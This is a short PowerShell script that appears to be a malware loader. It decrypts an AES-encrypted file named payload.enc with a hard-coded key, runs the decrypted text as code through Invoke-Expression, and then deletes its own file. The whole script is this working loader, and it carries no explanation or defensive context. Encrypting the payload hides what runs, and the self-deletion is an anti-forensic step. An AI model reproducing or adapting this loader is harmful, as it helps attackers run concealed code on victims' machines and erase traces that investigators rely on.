$key = [System.Text.Encoding]::UTF8.GetBytes("0123456789abcdef")
$iv  = [System.Text.Encoding]::UTF8.GetBytes("abcdef9876543210")

$AES = New-Object System.Security.Cryptography.AesManaged
$AES.Key = $key
$AES.IV = $iv
$AES.Mode = "CBC"
$AES.Padding = "PKCS7"

$enc = Get-Content "L:\payload.enc" -Raw
$bytes = [System.Convert]::FromBase64String($enc)
$decryptor = $AES.CreateDecryptor()
$plaintext = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
$script = [System.Text.Encoding]::UTF8.GetString($plaintext)

Invoke-Expression $script

# Self-delete
Remove-Item $MyInvocation.MyCommand.Path
